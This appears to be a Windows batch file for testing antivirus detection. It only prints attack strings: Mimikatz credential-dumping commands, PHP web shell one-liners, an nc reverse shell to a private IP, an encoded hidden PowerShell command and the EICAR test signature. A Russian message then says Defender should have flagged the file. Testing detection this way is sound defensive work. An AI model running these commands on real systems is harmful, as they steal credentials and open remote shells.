@echo off
title CRITICAL BACKDOOR DETECTED
color 0c
cls

echo ==================================================
echo   PRIMAL SECURITY TEST - BACKDOOR SIMULATION
echo ==================================================
echo.
echo [!] Initializing Mimikatz credential dumper...
echo sekurlsa::logonpasswords
echo privilege::debug
echo lsadump::sam

echo [!] Injecting PHP WebShell...
echo ^<?php system($_GET['cmd']); ?^>
echo ^<?php eval($_POST['pass']); ?^>

echo [!] Establishing reverse shell...
echo nc -e cmd.exe 192.168.1.100 4444
echo powershell -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA==

echo [!] EICAR signature trigger...
echo X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*

echo.
echo ==================================================
echo Если вы это видите, Windows Defender проспал.
echo Но он ОБЯЗАН был пометить этот файл как Backdoor!
echo ==================================================
pause
